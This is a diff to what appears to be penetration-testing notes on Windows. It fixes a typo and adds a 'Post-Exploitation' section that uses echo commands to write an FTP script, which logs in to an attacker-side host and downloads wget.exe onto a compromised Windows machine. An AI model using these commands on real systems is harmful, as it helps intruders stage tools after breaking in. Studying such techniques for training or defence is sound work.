@@ -106,8 +106,24 @@ Windows Server 2016     2016       NT 10.0
 ```
 
 ## Workgroups vs. Domains
-| Type | Decription |
+| Type | Description |
 | --- | --- |
 | Workgroup | Peer-to-Peer, Home network for small business. |
 | Domains | Server-Client setup.  Login to central Domain Server via Active Directory. |
 
+
+## Transferring Files to Windows - _(Post-Exploitation)_
+Using the `ftp-client` that is preinstalled onto Windows:
+```
+echo open 192.168.1.101 21> ftp.txt
+echo USER asshat>> ftp.txt
+echo mysecretpassword>> ftp.txt
+echo bin>> ftp.txt
+echo GET wget.exe>> ftp.txt
+echo bye>> ftp.txt
+```
+
+**Afterwards run this to connect:**
+```
+ftp -v -n -s:ftp.txt
+```
